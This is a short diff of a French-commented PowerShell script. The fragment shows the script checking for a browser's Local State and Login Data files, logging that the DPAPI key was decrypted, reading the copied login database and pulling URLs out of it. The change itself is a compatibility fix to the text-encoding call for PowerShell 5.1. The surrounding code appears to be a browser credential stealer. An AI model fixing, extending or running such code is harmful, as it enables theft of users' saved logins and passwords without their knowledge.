@@ -67,7 +67,8 @@ if ((Test-Path $localStatePath) -and (Test-Path $loginDataPath)) {
         Add-Content -Path $outputPath -Value "[+] Clé DPAPI déchiffrée avec succès."
 
         $dbBytes = [System.IO.File]::ReadAllBytes($tempDb)
-        $textContent = [System.Text.Encoding]::ISO_Latin1.GetString($dbBytes)
+        # Correction ici : Utilisation de GetEncoding compatible PS 5.1
+        $textContent = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($dbBytes)
 
         $urls = [regex]::Matches($textContent, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"]*)?')
         
